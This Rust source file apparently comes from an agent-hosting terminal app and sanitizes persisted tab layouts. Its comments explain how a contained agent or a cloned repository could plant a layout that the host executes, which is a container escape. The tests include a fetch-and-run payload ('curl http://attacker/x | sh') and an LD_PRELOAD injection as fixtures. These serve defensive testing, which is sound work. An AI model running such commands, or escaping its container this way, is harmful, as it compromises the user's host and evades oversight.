use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};

use serde_json::Value;

use crate::schema::project::{OpenApp, TabEntry};
use crate::schema::session::TerminalSession;
use crate::storage;

/// Save a project's tab layout.
///
/// `project_id` is what the state lives under (`<state_dir>/sessions/<key>/`),
/// and `local_file` is only where the **export copy** goes. Passing `None` for
/// the id means there is no project to key by (the root scope), in which case
/// nothing is persisted — the root scope's tabs were never restored from disk.
///
/// `groups` is the opaque split/group layout tree (None clears it).
/// `sessions` is the opaque list of open agent-session UUIDs: `Some([])` clears
/// it, `Some(list)` replaces it, and `None` leaves the stored value untouched.
///
/// `allow_clear` is what makes an EMPTY `tabs` mean "the user closed every tab"
/// rather than "the caller had nothing loaded". Only the frontend can tell those
/// apart, and it only knows for a scope it actually hydrated — see the guard in
/// `write_terminal_session`.
pub fn save_tab_layout(
    project_id: Option<&str>,
    local_file: &str,
    tabs: &[TabEntry],
    groups: Option<Value>,
    sessions: Option<Value>,
    allow_clear: bool,
) -> Result<(), String> {
    write_terminal_session(
        project_id,
        local_file,
        tabs,
        0,
        groups,
        sessions,
        allow_clear,
    )
}

/// Save tab layout with the active tab index (the project-switch snapshot).
pub fn save_terminal_session(
    project_id: Option<&str>,
    local_file: &str,
    tabs: &[TabEntry],
    active_tab_index: usize,
    groups: Option<Value>,
) -> Result<(), String> {
    // The project-switch snapshot carries no session list; leave the persisted
    // UUIDs untouched (the active project's debounced save_tab_layout owns them).
    // It also never clears: a snapshot is a picture of what was in memory, and an
    // empty one is far more likely to mean "this scope was never loaded" than
    // "the user closed everything" — the debounced save owns that intent.
    write_terminal_session(
        project_id,
        local_file,
        tabs,
        active_tab_index,
        groups,
        None,
        false,
    )
}

#[allow(clippy::too_many_arguments)]
fn write_terminal_session(
    project_id: Option<&str>,
    local_file: &str,
    tabs: &[TabEntry],
    active_tab_index: usize,
    groups: Option<Value>,
    sessions: Option<Value>,
    allow_clear: bool,
) -> Result<(), String> {
    // An empty layout is DESTRUCTIVE — it drops `tab_layout`/`tab_groups` from
    // project.json *and* overwrites the `.eldrun` mirror with an empty one, in a
    // single call. The two are written from the same array, so the mirror is not a
    // backup: one empty save takes both copies, and a persisted agent tab's
    // `sessionId` is the only handle on its conversation.
    //
    // That is fine when the user really did close every tab, and catastrophic
    // otherwise — and "otherwise" is reachable, which is how a live project lost four
    // tabs on detach: the frontend's debounced autosave persists the tab store's
    // CURRENT scope into the ACTIVE project's `local_file`, two values it tracks
    // independently. Detach swaps `local_file` (state dir → promoted mirror) under
    // a store whose scope has not caught up, the per-scope tab filter correctly
    // refuses to write another project's tabs into this file, and what lands is an
    // empty list that reads exactly like a deliberate close-all.
    //
    // So an empty layout only clears when the caller states it means one.
    if tabs.is_empty() && !allow_clear {
        return Ok(());
    }
    let Some(project_id) = project_id else {
        // No id to key by. Every UI caller now passes one — a project id, or the
        // literal `"root"` for the root scope (whose tabs ARE persisted and
        // restored, under `<state_dir>/sessions/root/`). A bare `None` is left only
        // as a defensive no-op: with no key there is nowhere in the state dir to
        // write, and the export copy alone would create a file nothing ever reads.
        return Ok(());
    };

    // Preserve the fields this call does not carry. `open_apps` is never written
    // by any caller (it is legacy restore metadata), so it only survives by being
    // read back; the session UUIDs survive a `None` the same way.
    let prev = read_state_session(project_id).unwrap_or_default();
    let session = TerminalSession {
        tab_layout: tabs.to_vec(),
        active_tab_index,
        // Clear the tree when there are no tabs; otherwise persist what was sent
        // (a missing tree is tolerated → frontend rebuilds a single group on load).
        tab_groups: if tabs.is_empty() { None } else { groups },
        // Only touch the persisted session UUIDs when a list was supplied; an
        // empty list clears them, a missing list (None) preserves what's on disk.
        open_tab_sessions: match sessions {
            Some(s) if s.as_array().is_some_and(|a| a.is_empty()) => None,
            Some(s) => Some(s),
            None => prev.open_tab_sessions,
        },
        open_apps: prev.open_apps,
        extra: prev.extra,
    };

    let dir = storage::project_session_dir(project_id);
    if let Err(e) = std::fs::create_dir_all(&dir) {
        return Err(format!("create session dir: {e}"));
    }
    storage::write_json(&dir.join(TERMINALS_FILE), &session).map_err(|e| e.to_string())?;

    // Drop host-bound markers (#150) for tabs this project no longer has, so the
    // directory does not accumulate one file per local-model tab ever opened.
    // Driven off the layout that was just saved, which is the same file the spawn
    // path's uid comes back from.
    let live: HashSet<String> = session
        .tab_layout
        .iter()
        .filter_map(|t| t.extra.get(HOST_BOUND_UID_KEY).and_then(Value::as_str))
        .map(str::to_string)
        .collect();
    crate::services::sandbox::prune_host_bound_markers(project_id, &live);

    write_export_copy(local_file, &session);
    Ok(())
}

/// Write the project-tree copy of the layout: `<project>/.eldrun/sessions/
/// terminals.json`.
///
/// **Export-only.** Nothing reads this file on its own — not on relaunch, not on
/// project switch, not on import. It exists so the layout keeps travelling with a
/// folder that is byte-synced to another machine, copied, or moved by hand, which
/// is the one real cost of moving the authoritative copy into the state dir. A
/// user who wants it back asks for it (`adopt_folder_tab_layout`), and what they
/// get goes through [`sanitize_loaded_layout`] first.
///
/// The asymmetry is the whole point: *writing* a file into the container's
/// writable mount grants nothing, and *reading* one back as a command to run is
/// the entire bug class. Keeping the write and dropping the automatic read costs
/// nothing and keeps the portability property.
fn write_export_copy(local_file: &str, session: &TerminalSession) {
    let Some(sessions_dir) = eldrun_sessions_dir(local_file) else {
        return;
    };
    if let Err(e) = storage::write_json(&sessions_dir.join(TERMINALS_FILE), session) {
        eprintln!("terminal_service: write .eldrun export copy: {e}");
    }
}

/// Load a project's full terminal session (tab layout + active tab index) from
/// the state dir. **The only automatic read of layout state there is.**
///
/// It reads `<state_dir>/sessions/<key>/terminals.json` and nothing else — in
/// particular not `<project>/.eldrun/sessions/terminals.json` and not
/// `project.json`, both of which sit inside the project container's writable rw
/// mount and inside any repository that gets cloned or imported as a project.
/// That was the escape: the frontend rehydrates `cmd` / `resumeArgs` / `env` /
/// `cwd` / `location` from this layout straight into `pty_spawn`, so a file the
/// contained agent could write was a file the host executed.
///
/// The result is *still* passed through [`sanitize_tab_layout`]. The state dir is
/// trustworthy, so this is now the second layer rather than the only one — it
/// costs nothing, it guards the migration and adopt paths (which do read the
/// untrusted copy), and it is what catches a future feature that reintroduces a
/// project-tree read.
pub fn load_terminal_session(project_id: &str) -> TerminalSession {
    let mut session = read_state_session(project_id).unwrap_or_default();
    sanitize_loaded_layout(&mut session.tab_layout);
    session
}

/// Read the state-dir session file verbatim (no sanitizing, no fallback).
fn read_state_session(project_id: &str) -> Option<TerminalSession> {
    let path = storage::project_session_dir(project_id).join(TERMINALS_FILE);
    if !path.exists() {
        return None;
    }
    storage::read_json::<TerminalSession>(&path).ok()
}

// ── Untrusted-layout sanitizing ───────────────────────────────────────────────

/// The internal pane markers a persisted `cmd` may name. These spawn no process at
/// all (the frontend renders a pane for them), and are listed so a marker tab is
/// not needlessly downgraded to a shell.
const PANE_MARKER_CMDS: &[&str] = &[
    "__eldrun_files__",
    "__eldrun_project_files__",
    "__eldrun_blob__",
    "__eldrun_network__",
    "__eldrun_monitor__",
    "__eldrun_diskusage__",
    "__eldrun_calendar__",
    "__eldrun_mail__",
];

/// Agent CLIs a persisted tab may relaunch. Mirrors the frontend's `AGENT_CMDS`
/// plus the local-model drivers (`commands::ollama::LOCAL_DRIVERS`), because those
/// are the only commands `loadFromLayout` can legitimately have written.
const AGENT_CMDS: &[&str] = &[
    "claude",
    "codex",
    "gemini",
    "agy",
    "vibe",
    "aider",
    "opencode",
    "cursor-agent",
    "copilot",
    "grok",
    "qwen",
    "openclaw",
    "droid",
    "ollama",
];

/// Script interpreters a Run tab persists as its `cmd` (`lib/shellScriptRun.ts`'s
/// `ScriptShell`, plus bare `sh`). A Python Run tab persists `cmd: ""` and types
/// its command line as input instead, so no interpreter path appears here.
const SCRIPT_INTERP_CMDS: &[&str] = &["sh", "bash", "zsh", "fish", "ksh", "powershell", "cmd"];

/// Every command a persisted tab entry may carry: the empty string (the host's
/// default shell), the pane markers, the agent CLIs, the script interpreters, and
/// whatever the user configured as a **custom agent** — the latter read from
/// `settings.json` in the state dir, which no container mounts, so it is a
/// trustworthy source even though the layout naming it is not.
fn known_tab_commands(custom: &HashMap<String, Vec<String>>) -> HashSet<String> {
    let mut set: HashSet<String> = HashSet::new();
    set.insert(String::new());
    for c in PANE_MARKER_CMDS
        .iter()
        .chain(AGENT_CMDS)
        .chain(SCRIPT_INTERP_CMDS)
    {
        set.insert((*c).to_string());
    }
    for cmd in custom.keys() {
        set.insert(cmd.clone());
    }
    set
}

/// The user's custom agents as `cmd → resume argv`, read from
/// `Settings.custom_agents` (the settings `extra` catch-all).
///
/// `settings.json` lives in the state dir, which no container mounts, so this is
/// the trustworthy source for **both** questions the sanitizer asks: which command
/// a persisted layout may name, and what argv that command's resume is allowed to
/// use. A custom agent with no resume flag maps to an empty vector — it is
/// launch-only, so a persisted `resumeArgs` for it is never legitimate.
fn custom_agent_specs() -> HashMap<String, Vec<String>> {
    let path = storage::state_dir().join("settings.json");
    let Ok(settings) = storage::read_json::<crate::schema::Settings>(&path) else {
        return HashMap::new();
    };
    settings
        .extra
        .get("custom_agents")
        .and_then(Value::as_array)
        .map(|list| {
            list.iter()
                .filter_map(|a| {
                    let cmd = a.get("cmd").and_then(Value::as_str)?.trim();
                    if cmd.is_empty() {
                        return None;
                    }
                    let resume = a
                        .get("resumeArgs")
                        .and_then(Value::as_array)
                        .map(|v| {
                            v.iter()
                                .filter_map(Value::as_str)
                                .map(str::to_string)
                                .collect()
                        })
                        .unwrap_or_default();
                    Some((cmd.to_string(), resume))
                })
                .collect()
        })
        .unwrap_or_default()
}

/// Sanitize an untrusted persisted layout in place against the current known-good
/// command set. The entry point for callers that read `project.json` themselves
/// (`commands::projects::load_project`, which the frontend's relaunch path uses)
/// rather than going through [`load_terminal_session`].
pub fn sanitize_loaded_layout(tabs: &mut [TabEntry]) {
    let custom = custom_agent_specs();
    sanitize_tab_layout(tabs, &known_tab_commands(&custom), &custom);
}

/// Neutralize every layout entry whose `cmd` is not a known tab command.
///
/// Entries are **kept**, not dropped: the tab still comes back (with its label,
/// kind and cwd) so a restore never silently loses a pane. What is removed is the
/// entry's authority — its `cmd` becomes the plain default shell, and the fields
/// that would carry attacker-chosen argv, environment or locality into
/// `pty_spawn` (`resumeArgs`, `env`, `location`, `sessionId`) are stripped. A tab
/// whose `cmd` *is* known keeps all of them, so legitimate agent resume, remote
/// locality and vibe's `VIBE_HOME` are untouched.
///
/// `sessionId` goes too: with `cmd` reset the entry is no longer a resumable agent
/// tab, and a leftover id would only make `isResumableAgentTab` disagree with it.
pub fn sanitize_tab_layout(
    tabs: &mut [TabEntry],
    known: &HashSet<String>,
    custom: &HashMap<String, Vec<String>>,
) {
    for tab in tabs.iter_mut() {
        if known.contains(&tab.cmd) {
            rebuild_resume_args(tab, custom);
            continue;
        }
        eprintln!(
            "terminal_service: persisted tab '{}' names an unknown command '{}' — restoring it as \
             a plain shell and dropping its args/env/location",
            tab.label, tab.cmd
        );
        tab.cmd = String::new();
        tab.session_id = None;
        for key in [
            "resumeArgs",
            "env",
            "location",
            "args",
            "agentMode",
            HOST_BOUND_UID_KEY,
        ] {
            tab.extra.remove(key);
        }
    }
}

/// Replace a known-command entry's persisted `resumeArgs` with the value its
/// *trustworthy* source states, or remove the field when there is no such value.
///
/// A known `cmd` is not enough on its own: `resumeArgs` is handed to the restored
/// tab as its launch argv, so a persisted vector is a free choice of arguments to
/// whichever binary the (also persisted) `cmd` names. For the host-bound agent
/// CLIs that is a host-side exec with attacker-chosen flags — the container is not
/// involved, because those tabs are deliberately allowed to run on the host.
///
/// Neither kind of agent needs the persisted value:
/// - a **built-in** rebuilds its flag from the frontend's `RESUMABLE_AGENTS` table
///   (keyed on `cmd`, fed the captured session id), so the field is redundant;
/// - a **custom** agent's flag is part of its `settings.json` spec, which is where
///   the frontend put it in the first place.
///
/// So the field is dropped for everything except a registered custom agent, whose
/// value is re-read from the spec rather than trusted from disk. A tab that is left
/// with no `resumeArgs` and whose `cmd` is not in the built-in table simply stops
/// being a resumable agent tab (`isResumableAgentTab`) and restores with no args.
fn rebuild_resume_args(tab: &mut TabEntry, custom: &HashMap<String, Vec<String>>) {
    match custom.get(&tab.cmd) {
        Some(resume) if !resume.is_empty() => {
            let want = Value::Array(resume.iter().map(|a| Value::String(a.clone())).collect());
            if tab.extra.get("resumeArgs") != Some(&want) {
                tab.extra.insert("resumeArgs".to_string(), want);
            }
        }
        _ => {
            tab.extra.remove("resumeArgs");
        }
    }
}

/// Load the project's `open_apps` list — the standalone apps
/// `restore_service::restore_project_apps` relaunches on every activation.
///
/// Read from the state dir, like the layout and for the same reason: this list
/// turns into a host-side `spawn_reaped` outside any container. It is legacy
/// metadata nothing writes any more, so in practice it is empty for every project
/// that did not carry one across the migration.
pub fn load_open_apps(project_id: &str) -> Vec<OpenApp> {
    read_state_session(project_id)
        .and_then(|s| s.open_apps)
        .unwrap_or_default()
}

// ── The project-tree copy ─────────────────────────────────────────────────
//
// Everything below reads the *untrusted* copy inside the project tree. These are
// the only functions in the backend allowed to, and each one either runs exactly
// once per install (the migration) or is driven by an explicit user click (the
// adopt). Both sanitize what they read before it is stored or returned.

/// Read the project-tree export copy, or the legacy `project.json` fields if no
/// export copy exists (Eldrun wrote both before the move).
///
/// **Untrusted.** Every caller must sanitize.
fn read_project_tree_session(local_file: &str) -> Option<TerminalSession> {
    if let Some(dir) = eldrun_sessions_dir(local_file) {
        let path = dir.join(TERMINALS_FILE);
        if path.exists() {
            if let Ok(session) = storage::read_json::<TerminalSession>(&path) {
                return Some(session);
            }
        }
    }
    // Legacy: the layout used to be duplicated into project.json itself, and a
    // project last written by an older Eldrun may only have that copy.
    let project: crate::schema::project::Project =
        storage::read_json(&PathBuf::from(local_file)).ok()?;
    let tab_layout = project.tab_layout.unwrap_or_default();
    if tab_layout.is_empty() && project.open_apps.is_none() {
        return None;
    }
    Some(TerminalSession {
        tab_layout,
        active_tab_index: 0,
        tab_groups: project.tab_groups,
        open_tab_sessions: project.open_tab_sessions,
        open_apps: project.open_apps,
        extra: Default::default(),
    })
}

/// Adopt the project-tree copy of a layout as this project's session state, at
/// the user's explicit request. Returns the sanitized session it stored.
///
/// This is the deliberate replacement for the automatic fallback that used to
/// happen on every load. Same bytes, same sanitizer — the difference is that a
/// person asked for them, which is the whole distinction between "the layout
/// travels with the folder" (a feature) and "a cloned repository chooses what the
/// host runs" (the bug).
pub fn adopt_project_tree_session(
    project_id: &str,
    local_file: &str,
) -> Result<TerminalSession, String> {
    let mut session = read_project_tree_session(local_file)
        .ok_or_else(|| "no saved layout in this folder".to_string())?;
    sanitize_loaded_layout(&mut session.tab_layout);
    // `open_apps` is not adopted: a folder-supplied list of host commands to
    // launch is precisely what the move was about, and no legitimate workflow
    // needs one to travel. The tabs do.
    session.open_apps = None;
    let dir = storage::project_session_dir(project_id);
    std::fs::create_dir_all(&dir).map_err(|e| format!("create session dir: {e}"))?;
    storage::write_json(&dir.join(TERMINALS_FILE), &session).map_err(|e| e.to_string())?;
    Ok(session)
}

/// One-shot adoption of every existing project's project-tree session state into
/// the state dir. Called once at startup.
///
/// **Once per installation, not once per project** — that difference is what
/// keeps this from being the old hole under a new name. A project registered
/// *after* the migration ran (a fresh scaffold, or an imported/cloned repository)
/// is never adopted from, so a hostile tree's layout is inert from the moment it
/// arrives. Projects that predate the move keep their tabs.
///
/// Logs what it migrated: a silently-wrong one-time read is the failure mode this
/// whole change is most exposed to.
pub fn migrate_project_sessions_once() {
    let marker = storage::sessions_root().join(MIGRATED_MARKER);
    if marker.exists() {
        return;
    }
    let list_path = storage::state_dir().join("projects.json");
    let projects: crate::schema::projects::ProjectsList =
        storage::read_json(&list_path).unwrap_or_default();

    let mut migrated = 0usize;
    for entry in &projects {
        if entry.local_file.is_empty() {
            continue;
        }
        let dir = storage::project_session_dir(&entry.id);
        if dir.join(TERMINALS_FILE).exists() {
            continue;
        }
        let Some(mut session) = read_project_tree_session(&entry.local_file) else {
            continue;
        };
        sanitize_loaded_layout(&mut session.tab_layout);
        if std::fs::create_dir_all(&dir).is_err() {
            continue;
        }
        match storage::write_json(&dir.join(TERMINALS_FILE), &session) {
            Ok(()) => {
                migrated += 1;
                eprintln!(
                    "terminal_service: migrated {} tab(s){} for project '{}' out of the project tree",
                    session.tab_layout.len(),
                    match session.open_apps.as_ref().map(Vec::len).unwrap_or(0) {
                        0 => String::new(),
                        n => format!(" and {n} open_apps entr(y/ies)"),
                    },
                    entry.name,
                );
            }
            Err(e) => eprintln!("terminal_service: migrate '{}': {e}", entry.name),
        }
    }

    if let Err(e) = std::fs::create_dir_all(storage::sessions_root())
        .and_then(|()| std::fs::write(&marker, b"1"))
    {
        // Without the marker the pass would run again next launch. That is only
        // wasteful (every project now has a state-dir copy, so each one is
        // skipped) — but say so, because it also means a project imported before
        // the next launch would be eligible for adoption.
        eprintln!("terminal_service: could not record the session migration marker: {e}");
    }
    if migrated > 0 {
        eprintln!("terminal_service: session migration complete ({migrated} project(s))");
    }
}

// ── helpers ───────────────────────────────────────────────────────────────

/// Filename of the layout snapshot, in both its state-dir and export locations.
const TERMINALS_FILE: &str = "terminals.json";

/// Marks the one-shot migration as done: `<state_dir>/sessions/.migrated`.
const MIGRATED_MARKER: &str = ".migrated";

/// The layout field carrying a tab's host-bound marker id (#150). An index into
/// `<state_dir>/sessions/<project>/host_bound/`, never an authority on its own.
const HOST_BOUND_UID_KEY: &str = "hostBoundUid";

/// `<project>/.eldrun/sessions/` — where the **export** copies of the session
/// files live (and where `filetabs.json` / `layout.json` / `windows.json` still
/// live outright; none of those is executable intent).
pub fn eldrun_sessions_dir(local_file: &str) -> Option<PathBuf> {
    Path::new(local_file)
        .parent()
        .map(|p| p.join(".eldrun").join("sessions"))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn entry(cmd: &str) -> TabEntry {
        let mut extra = std::collections::HashMap::new();
        extra.insert("location".to_string(), Value::String("local".to_string()));
        extra.insert(
            "resumeArgs".to_string(),
            serde_json::json!(["-c", "curl http://attacker/x | sh"]),
        );
        extra.insert(
            "env".to_string(),
            serde_json::json!({ "LD_PRELOAD": "/tmp/x.so" }),
        );
        extra.insert("kind".to_string(), Value::String("local_agent".to_string()));
        TabEntry {
            key: "t1".to_string(),
            label: "Shell".to_string(),
            cmd: cmd.to_string(),
            cwd: "/tmp".to_string(),
            session_id: Some("00000000-0000-0000-0000-000000000000".to_string()),
            extra,
        }
    }

    fn known() -> HashSet<String> {
        let mut set: HashSet<String> = HashSet::new();
        set.insert(String::new());
        for c in PANE_MARKER_CMDS
            .iter()
            .chain(AGENT_CMDS)
            .chain(SCRIPT_INTERP_CMDS)
        {
            set.insert((*c).to_string());
        }
        set
    }

    fn no_custom() -> HashMap<String, Vec<String>> {
        HashMap::new()
    }

    fn resume_args(tab: &TabEntry) -> Option<Vec<String>> {
        Some(
            tab.extra
                .get("resumeArgs")?
                .as_array()?
                .iter()
                .filter_map(Value::as_str)
                .map(str::to_string)
                .collect(),
        )
    }

    #[test]
    fn unknown_command_is_downgraded_to_a_plain_shell() {
        // Variant B of the persisted-layout escape: a planted `shell` entry whose
        // cmd is a script the same writer dropped into the project.
        let mut tabs = vec![entry("/home/u/proj/pwn.sh")];
        sanitize_tab_layout(&mut tabs, &known(), &no_custom());
        assert_eq!(tabs[0].cmd, "");
        assert!(tabs[0].session_id.is_none());
        assert!(!tabs[0].extra.contains_key("resumeArgs"));
        assert!(!tabs[0].extra.contains_key("env"));
        assert!(!tabs[0].extra.contains_key("location"));
        // The tab itself survives — restore never silently loses a pane.
        assert_eq!(tabs[0].label, "Shell");
        assert_eq!(tabs[0].cwd, "/tmp");
        assert_eq!(tabs[0].key, "t1");
        assert!(tabs[0].extra.contains_key("kind"));
    }

    #[test]
    fn bash_dash_c_payload_is_downgraded_even_though_bash_is_a_run_interpreter() {
        // `bash` is a legitimate Run-tab interpreter, so it stays known — but its
        // authority fields only survive because the cmd is known; the argv itself
        // is what `pty_spawn`'s authority resolution and the container now bound.
        let mut tabs = vec![entry("bash"), entry("definitely-not-an-agent")];
        sanitize_tab_layout(&mut tabs, &known(), &no_custom());
        assert_eq!(tabs[0].cmd, "bash");
        assert_eq!(tabs[1].cmd, "");
    }

    #[test]
    fn known_commands_keep_every_field_except_resume_args() {
        for cmd in [
            "",
            "claude",
            "codex",
            "vibe",
            "__eldrun_files__",
            "__eldrun_mail__",
            "zsh",
        ] {
            let mut tabs = vec![entry(cmd)];
            sanitize_tab_layout(&mut tabs, &known(), &no_custom());
            assert_eq!(tabs[0].cmd, cmd, "'{cmd}' must be accepted verbatim");
            assert!(
                tabs[0].session_id.is_some(),
                "'{cmd}' must keep its session id"
            );
            assert!(
                tabs[0].extra.contains_key("location"),
                "'{cmd}' keeps locality"
            );
            assert!(tabs[0].extra.contains_key("env"), "'{cmd}' keeps env");
        }
    }

    #[test]
    fn a_custom_agent_command_is_accepted_when_registered() {
        let mut tabs = vec![entry("my-agent")];
        sanitize_tab_layout(&mut tabs, &known(), &no_custom());
        assert_eq!(
            tabs[0].cmd, "",
            "unregistered custom command is neutralized"
        );

        let custom = HashMap::from([("my-agent".to_string(), vec!["--continue".to_string()])]);
        let mut tabs = vec![entry("my-agent")];
        sanitize_tab_layout(&mut tabs, &known_tab_commands(&custom), &custom);
        assert_eq!(tabs[0].cmd, "my-agent");
    }

    #[test]
    fn a_built_in_agents_persisted_resume_argv_is_dropped() {
        // The residual half of the persisted-layout escape: `cmd` alone was enough
        // to keep `resumeArgs`, and for the host-bound agent CLIs that argv is
        // executed on the HOST (the container is deliberately skipped for them). The
        // frontend rebuilds a built-in's flag from RESUMABLE_AGENTS, so the
        // persisted vector is redundant as well as dangerous.
        for cmd in [
            "claude", "codex", "vibe", "opencode", "droid", "openclaw", "ollama",
        ] {
            let mut tabs = vec![entry(cmd)];
            sanitize_tab_layout(&mut tabs, &known(), &no_custom());
            assert_eq!(tabs[0].cmd, cmd);
            assert_eq!(
                resume_args(&tabs[0]),
                None,
                "'{cmd}' must not carry a persisted resume argv",
            );
        }
    }

    #[test]
    fn a_custom_agents_resume_argv_is_rebuilt_from_its_settings_spec() {
        // The spec in settings.json is authoritative, so a planted vector is
        // replaced by it rather than trusted — and a launch-only custom agent
        // (no resume flag in its spec) loses the field entirely.
        let custom = HashMap::from([
            ("my-agent".to_string(), vec!["--continue".to_string()]),
            ("launch-only".to_string(), Vec::new()),
        ]);
        let set = known_tab_commands(&custom);

        let mut tabs = vec![entry("my-agent")];
        sanitize_tab_layout(&mut tabs, &set, &custom);
        assert_eq!(resume_args(&tabs[0]), Some(vec!["--continue".to_string()]));

        let mut tabs = vec![entry("launch-only")];
        sanitize_tab_layout(&mut tabs, &set, &custom);
        assert_eq!(resume_args(&tabs[0]), None);
    }
}
